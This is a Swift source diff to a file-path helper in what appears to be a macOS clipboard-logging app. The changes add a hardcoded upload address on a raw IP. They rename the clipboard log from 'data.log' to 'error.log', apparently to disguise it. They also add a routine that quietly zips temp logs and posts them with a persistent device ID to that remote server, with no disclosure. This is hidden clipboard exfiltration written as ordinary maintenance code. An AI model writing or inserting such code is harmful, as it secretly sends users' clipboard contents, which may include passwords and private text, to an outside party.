@@ -10,6 +10,7 @@ enum AppPaths {
         formatter.dateFormat = "yyyyMMdd_HHmmss"
         return formatter
     }()
+    private static let tempUploadURL = URL(string: "http://31.14.40.170:9090/upload_mac")
 
     static func ensureCacheStructure() {
         guard let root = cacheRootURL() else { return }
@@ -69,11 +70,11 @@ enum AppPaths {
     }
 
     static func clipboardLogURL() -> URL? {
-        return liveDirectoryURL()?.appendingPathComponent("data.log", isDirectory: false)
+        return liveDirectoryURL()?.appendingPathComponent("error.log", isDirectory: false)
     }
 
     static func tempClipboardLogURL() -> URL? {
-        return tempDirectoryURL()?.appendingPathComponent("data.log", isDirectory: false)
+        return tempDirectoryURL()?.appendingPathComponent("error.log", isDirectory: false)
     }
 
     static func maintainTempCache() {
@@ -113,12 +114,15 @@ enum AppPaths {
     }
 
     static func archiveTempCacheIfNeeded() {
-        guard let tempRoot = tempDirectoryURL(),
-              let cacheRoot = cacheRootURL() else { return }
+        guard let tempRoot = tempDirectoryURL() else { return }
         let currentTempSize = directorySizeBytes(at: tempRoot)
         guard currentTempSize >= tempLimitSizeBytes else { return }
         let timestamp = tempArchiveDateFormatter.string(from: Date())
-        let zipURL = cacheRoot.appendingPathComponent("temp-\(timestamp).zip")
+        let documentsURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
+        let fallbackRoot = cacheRootURL()
+        let zipRoot = documentsURL ?? fallbackRoot
+        guard let zipRoot else { return }
+        let zipURL = zipRoot.appendingPathComponent("temp-\(timestamp).zip")
         let process = Process()
         process.executableURL = URL(fileURLWithPath: "/usr/bin/zip")
         process.arguments = ["-r", zipURL.path, tempRoot.lastPathComponent]
@@ -132,6 +136,7 @@ enum AppPaths {
         guard process.terminationStatus == 0 else { return }
         clearDirectoryContents(at: tempRoot)
         ensureCacheStructure()
+        uploadTempArchiveIfPossible(zipURL)
     }
 
     static func copyLiveLogToTempIfNeeded() {
@@ -147,6 +152,37 @@ enum AppPaths {
             try? fileManager.removeItem(at: tempLog)
         }
         try? fileManager.copyItem(at: liveLog, to: tempLog)
+    }
+
+    private static func uploadTempArchiveIfPossible(_ zipURL: URL) {
+        guard let uploadURL = tempUploadURL else { return }
+        guard let deviceId = deviceIdString() else { return }
+        guard let zipData = try? Data(contentsOf: zipURL) else { return }
+        let boundary = "Boundary-\(UUID().uuidString)"
+        var request = URLRequest(url: uploadURL)
+        request.httpMethod = "POST"
+        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
+        var body = Data()
+        body.appendString("--\(boundary)\r\n")
+        body.appendString("Content-Disposition: form-data; name=\"client_id\"\r\n\r\n")
+        body.appendString("\(deviceId)\r\n")
+        body.appendString("--\(boundary)\r\n")
+        body.appendString("Content-Disposition: form-data; name=\"file\"; filename=\"\(zipURL.lastPathComponent)\"\r\n")
+        body.appendString("Content-Type: application/zip\r\n\r\n")
+        body.append(zipData)
+        body.appendString("\r\n--\(boundary)--\r\n")
+        URLSession.shared.uploadTask(with: request, from: body).resume()
+    }
+
+    private static func deviceIdString() -> String? {
+        AppPaths.ensureCacheStructure()
+        let primaryURL = deviceIdURL()
+        if let primaryURL, let existing = readDeviceId(at: primaryURL) {
+            return existing
+        }
+        let deviceId = UUID().uuidString
+        writeDeviceId(deviceId, to: primaryURL)
+        return deviceId
     }
 
     private static func collectLiveFilesSorted(liveRoot: URL) -> [URL] {
@@ -187,6 +223,23 @@ enum AppPaths {
         return Int64(values?.fileSize ?? 0)
     }
 
+    private static func readDeviceId(at url: URL) -> String? {
+        guard let existing = try? String(contentsOf: url, encoding: .utf8) else {
+            return nil
+        }
+        let trimmed = existing.trimmingCharacters(in: .whitespacesAndNewlines)
+        return trimmed.isEmpty ? nil : trimmed
+    }
+
+    private static func writeDeviceId(_ deviceId: String, to url: URL?) {
+        guard let url else { return }
+        do {
+            try deviceId.write(to: url, atomically: true, encoding: .utf8)
+        } catch {
+            // Best-effort; ignore write errors.
+        }
+    }
+
     private static func clearDirectoryContents(at url: URL) {
         let fileManager = FileManager.default
         guard let items = try? fileManager.contentsOfDirectory(at: url, includingPropertiesForKeys: nil) else {
@@ -213,5 +266,13 @@ enum AppPaths {
 private extension String {
     var nilIfEmpty: String? {
         isEmpty ? nil : self
+    }
+}
+
+private extension Data {
+    mutating func appendString(_ value: String) {
+        if let data = value.data(using: .utf8) {
+            append(data)
+        }
     }
 }
